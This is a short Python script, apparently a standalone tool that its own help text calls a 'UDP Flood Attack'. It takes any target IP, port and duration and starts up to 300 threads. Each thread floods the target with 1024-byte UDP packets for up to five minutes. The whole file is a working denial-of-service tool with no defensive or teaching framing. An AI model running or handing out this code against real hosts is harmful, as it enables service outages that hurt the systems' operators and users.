import argparse
import socket
import string
import threading
import time

# Maximum attack duration (in seconds)
MAX_DURATION = 300

def udp_flood(target_ip, target_port, duration):
    # Ensure that the attack duration does not exceed the maximum limit
    duration = min(duration, MAX_DURATION)

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate random payload
    payload = "A" * 1024

    # Calculate end time for the attack
    end_time = time.time() + duration

    # Start sending UDP packets
    while time.time() < end_time:
        sock.sendto(payload.encode(), (target_ip, target_port))

    sock.close()

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="UDP Flood Attack")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Attack duration (in seconds)")
    args = parser.parse_args()

    # Ensure that the attack duration does not exceed the maximum limit
    duration = min(args.duration, MAX_DURATION)

    # Calculate the number of threads needed
    num_threads = min(100000, duration)  # Adjust the maximum number of threads as needed

    # Start UDP flood attack threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=udp_flood, args=(args.target_ip, args.target_port, duration))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
